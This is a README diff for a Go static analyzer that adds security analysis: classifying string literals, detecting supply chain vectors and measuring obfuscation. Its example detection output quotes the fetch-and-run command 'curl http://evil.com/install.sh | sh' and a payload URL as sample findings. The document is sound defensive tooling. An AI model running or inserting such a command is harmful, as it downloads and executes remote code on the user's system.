@@ -3,7 +3,7 @@
 [![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev/)
 [![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 
-**Static analyzer for Go projects**, compatible with [CodeLLM DevKit (CLDK)](https://github.com/codellm-devkit). Produces Symbol Table, Call Graph, and PDG (Program Dependence Graph) in stable JSON format.
+**Static analyzer for Go projects**, compatible with [CodeLLM DevKit (CLDK)](https://github.com/codellm-devkit). Produces Symbol Table, Call Graph, PDG/SDG, and **Security Analysis** (string extraction, supply chain detection, obfuscation metrics) in stable JSON format.
 
 ## Features
 
@@ -14,7 +14,13 @@
 - **Call Examples**: identifies callers of each function (requires `--include-body`)
 - **Clean Documentation**: newlines removed from all docstrings for cleaner JSON output
 - **Call Graph Construction**: using `golang.org/x/tools/go/ssa` with CHA or RTA algorithms
+- **API Category Classification**: call graph edges automatically tagged with security categories (`execution`, `network`, `filesystem`, `crypto`, `process`, `reflection`, `unsafe`, `plugin`)
 - **PDG (Program Dependence Graph)**: intra-procedural data and control dependency analysis per function, grouped by package
+- **SDG (System Dependence Graph)**: inter-procedural analysis with call/param-in/param-out edges
+- **🔒 Security Analysis** (opt-in via `--security`):
+  - **String Literal Extraction**: extracts all string constants with automatic classification (URL, IP, path, command, base64, crypto wallet, domain, etc.) and Shannon entropy
+  - **Supply Chain Vector Detection**: identifies `//go:generate`, `//go:linkname`, CGo, `plugin.Open`, `unsafe`, `init()` side-effects, global variable side-effects, reflection-based dynamic dispatch
+  - **Obfuscation Metrics**: average name lengths, short names ratio, doc coverage, XOR operation count, Garble obfuscator pattern detection
 - **CLDK Compatible**: output follows CLDK schema conventions for seamless integration
 - **Compact Output**: LLM-optimized format with ~70-85% size reduction
 - **Flexible Filtering**: exclude directories, filter by package path, include/exclude tests
@@ -86,6 +92,12 @@ codeanalyzer-go --input ./myproject --analysis-level pdg
 
 # Save output to directory
 codeanalyzer-go --input ./myproject --output ./output
+
+# 🔒 Enable security analysis (strings, supply chain, obfuscation)
+codeanalyzer-go --input ./myproject --security
+
+# Full analysis with security + compact output for LLM
+codeanalyzer-go --input ./myproject --security --compact -o ./output
 ```
 
 ## CLI Reference
@@ -121,6 +133,7 @@ codeanalyzer-go [flags]
 | `--include-body` | Include function body information | `false` |
 | `--verbose`, `-v` | Enable verbose logging to stderr | `false` |
 | `--quiet`, `-q` | Suppress non-error output | `false` |
+| `--security` | Enable security analysis (strings, supply chain, obfuscation) | `false` |
 | `--version` | Show version and exit | |
 
 ## Output Schema
@@ -131,12 +144,12 @@ The output follows CLDK conventions with this structure:
 {
   "metadata": {
     "analyzer": "codeanalyzer-go",
-    "version": "2.0.0",
+    "version": "2.1.0",
     "language": "go",
     "analysis_level": "full",
-    "timestamp": "2026-02-01T12:00:00Z",
+    "timestamp": "2026-04-07T14:00:00Z",
     "project_path": "/path/to/project",
-    "go_version": "go1.21",
+    "go_version": "go1.24",
     "analysis_duration_ms": 1234
   },
   "symbol_table": {
@@ -183,7 +196,7 @@ The output follows CLDK conventions with this structure:
   "call_graph": {
     "algorithm": "rta",
     "nodes": [{"id": "example.com/myapp.main", "kind": "function"}],
-    "edges": [{"source": "example.com/myapp.main", "target": "fmt.Println", "kind": "call"}]
+    "edges": [{"source": "example.com/myapp.main", "target": "fmt.Println", "kind": "call", "category": "filesystem"}]
   },
   "pdg": {
     "packages": {
@@ -235,6 +248,98 @@ The output follows CLDK conventions with this structure:
 - **Call examples**: `call_examples` array on callables (requires `--include-body`)
 - **PDG per-package**: `pdg.packages` mirrors `symbol_table.packages` — each package contains a `functions` map with nodes, data edges (use-def), and control edges (branch conditions)
 - **SDG per-caller-package**: `sdg.packages` groups inter-procedural edges (call, param-in, param-out) by the package where the caller resides
+- **API Categories**: call graph edges include `category` field for security-relevant API calls (`execution`, `network`, `filesystem`, `crypto`, `process`, `reflection`, `unsafe`, `plugin`)
+
+## 🔒 Security Analysis
+
+Enable with `--security` to add malware and supply chain analysis data. All security fields are opt-in and `omitempty` — existing CLDK consumers see no changes without the flag.
+
+```bash
+codeanalyzer-go --input ./suspicious-project --security --verbose
+```
+
+### String Literal Extraction
+
+Extracts all string constants from the source code, classifies them, and computes Shannon entropy:
+
+```json
+"string_literals": [
+  {
+    "value": "http://evil.com/payload.exe",
+    "category": "url",
+    "entropy": 4.12,
+    "scope": "main.downloadPayload",
+    "position": {"file": "main.go", "start_line": 42, "start_column": 18}
+  },
+  {
+    "value": "C:\\Windows\\System32\\cmd.exe",
+    "category": "path_win",
+    "entropy": 3.89,
+    "scope": "main.executeBackdoor"
+  }
+]
+```
+
+**Categories:** `url`, `ip`, `path_win`, `path_unix`, `base64`, `command`, `crypto_wallet`, `mining_pool`, `domain`, `registry`, `email`, `other`
+
+### Supply Chain Vector Detection
+
+Detects attack vectors inspired by the [GoSurf](https://arxiv.org/abs/2407.04442) taxonomy:
+
+```json
+"supply_chain_vectors": [
+  {
+    "kind": "go_generate",
+    "detail": "curl http://evil.com/install.sh | sh",
+    "severity": "critical",
+    "file": "generate.go",
+    "position": {"file": "generate.go", "start_line": 3}
+  },
+  {
+    "kind": "init_side_effect",
+    "detail": "init() calls: http.Get, exec.Command",
+    "severity": "critical",
+    "file": "backdoor.go"
+  }
+]
+```
+
+**Vector Kinds:** `go_generate`, `go_linkname`, `compiler_directive`, `cgo_usage`, `plugin_load`, `unsafe_usage`, `init_side_effect`, `global_side_effect`, `dynamic_dispatch`
+
+### Obfuscation Metrics
+
+Computes per-package heuristic indicators for code obfuscation:
+
+```json
+"obfuscation_metrics": {
+  "avg_func_name_len": 5.2,
+  "avg_var_name_len": 3.1,
+  "short_names_ratio": 42.5,
+  "doc_coverage": 0.0,
+  "string_entropy_avg": 4.8,
+  "high_entropy_strings": 15,
+  "xor_operations": 7,
+  "has_garble_patterns": true
+}
+```
+
+### API Category Classification
+
+Call graph edges are automatically enriched with security categories (~70 stdlib APIs mapped):
+
+| Category | Example APIs |
+|----------|-------------|
+| `execution` | `os/exec.Command`, `syscall.Exec` |
+| `network` | `net.Dial`, `net/http.Get`, `net.Listen` |
+| `filesystem` | `os.WriteFile`, `os.Remove`, `os.ReadFile` |
+| `crypto` | `crypto/aes.NewCipher`, `crypto/rsa.GenerateKey` |
+| `process` | `os.Exit`, `os/signal.Notify` |
+| `reflection` | `reflect.ValueOf`, `reflect.MakeFunc` |
+| `unsafe` | `unsafe.Pointer` |
+| `plugin` | `plugin.Open` |
+
+> **Note:** API categories are always active on call graph edges (not gated by `--security`), as they enrich existing data with zero overhead.
+
 ## LLM Compact Output
 
 Use `--compact` for LLM-optimized output with ~70-85% size reduction:
@@ -247,17 +352,28 @@ codeanalyzer-go -i ./myproject -a symbol_table --compact > analysis.json
 codeanalyzer-go -i ./myproject -a full --compact --include-body -o ./output
 ```
 
-**Compact schema features:**
-- Abbreviated JSON keys (`metadata` -> `m`, `packages` -> `p`)
-- Package documentation: `d` field on packages
-- Interface methods: `im` field on types (signature strings)
-- Call examples: `ex` field on functions
-- Security Metadata on packages: `init`, `gor`, `env`, `bt`, `ub`, `main`
-- Documentation only for exported functions (truncated to 200 chars)
-- No position information
-- Simplified call graph edges: `[[source, target], ...]`
-- PDG per-package: `pdg.p.{pkg}.f.{fn}` with nodes `n`, data edges `d`, control edges `c`
-- SDG per-caller-package: `sdg.p.{pkg}.e` with edges as `[kind, caller, callee, caller_node, callee_node, param_idx, var]`
+**Compact Schema Structure (Legend):**
+
+- **Root Keys**:
+  - `m` : Meta (version, duration)
+  - `p` : Packages (map of `package_path` -> `Package`)
+  - `cg`: Call Graph
+  - `pdg` / `sdg` : Dependency Graphs
+  - `iss`: Issues & Warnings
+
+- **Inside Package (`p`)**:
+  - `n` : Name / `d` : Documentation / `f` : Files
+  - `i` : Imports / `t` : Types / `fn` : Functions / `v` : Vars / `c` : Constants
+  - **Security Flags**: `init`, `gor` (goroutine), `env`, `bt` (build tags), `ub` (used by), `main`
+  - **Security Analysis (v2.1.0)**:
+    - `sl`: String Literals (`v`: value, `c`: category, `e`: entropy, `s`: scope)
+    - `sc`: Supply Chain Vectors (`k`: kind, `s`: severity, `d`: detail)
+    - `obf`: Obfuscation Metrics (`fl`: avg func len, `vl`: avg var len, `sr`: short ratio, `dc`: doc coverage, `xor`: xor ops, `se`: string entropy, `hs`: high entropy strings, `gb`: garble detected)
+
+- **Inside Functions (`fn`) & Types (`t`)**:
+  - `ex`: Call examples
+  - `im`: Interface methods (on types)
+  - *Note: position info is omitted, and docstrings are truncated to 200 chars*
 
 ## Call Graph Algorithms
 
@@ -377,11 +493,14 @@ codeanalyzer-go/
 ├── internal/
 │   ├── loader/             # Package loading with SSA support
 │   ├── symbols/            # Symbol table extraction
-│   ├── callgraph/          # Call graph construction (CHA/RTA)
+│   ├── callgraph/          # Call graph construction (CHA/RTA) + API categorization
 │   ├── pdg/                # Program Dependence Graph (intra-procedural)
 │   ├── sdg/                # System Dependence Graph (inter-procedural)
+│   ├── strings/            # 🔒 String literal extraction & classification
+│   ├── supplychain/        # 🔒 Supply chain vector detection
+│   ├── obfuscation/        # 🔒 Obfuscation metrics computation
 │   └── output/             # JSON output writer
-├── pkg/schema/             # CLDK schema definitions
+├── pkg/schema/             # CLDK schema definitions + compact format
 ├── tests/                  # Integration tests
 └── sampleapp/              # Sample Go project for testing
 ```
